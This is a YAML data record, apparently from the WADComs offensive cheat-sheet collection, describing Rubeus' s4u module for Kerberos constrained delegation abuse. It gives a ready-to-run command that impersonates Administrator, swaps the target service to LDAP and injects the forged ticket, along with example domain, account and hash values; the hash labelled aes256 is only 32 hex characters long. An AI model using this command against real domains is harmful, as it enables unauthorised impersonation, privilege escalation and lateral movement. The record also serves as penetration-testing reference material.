source_data:
  WADComs:
    raw:
      file: Rubeus-s4u.md
      document: "\n---\ndescription: |\n  Rubeus' `s4u` module performs Kerberos constrained delegation\
        \ attacks using the S4U2Self and S4U2Proxy. This technique abuses accounts configured with delegation\
        \ privileges (msDS-AllowedToDelegateTo) to impersonate any domain user and further alter the service\
        \ specified since SPNs are stored in plaintext and thus access any service on the target system\
        \ as any user\n\n  Command Reference:\n\n  \tDomain: test.local\n\n    SPN: time/dc.test.local\n\
        \n    alternative service: ldap(can chose any valid services such as HTTP for remoting access)\n\
        \n  \tUsername: john$\n\n  \tHash: 2a3de7fe356ee524cc9f3d579f2e0aa7\n\ncommand: |\n  Rubeus.exe\
        \ s4u /user:john$ /aes256:2a3de7fe356ee524cc9f3d579f2e0aa7 /impersonateuser:Administrator /msdsspn:time/dc.test.local\
        \ /altservice:ldap /ptt\nitems:\n  - Hash\n  - Username\n  - target\n  - service\nservices:\n\
        \  - Kerberos\nOS:\n  - Windows\nattack_types:\n  - Exploitation\n  - Lateral Movement\n  - Privilidge\
        \ Escalation\nreferences:\n  - https://github.com/GhostPack/Rubeus\n  - https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/constrained-delegation\n\
        \  - https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation\n\
        ---"
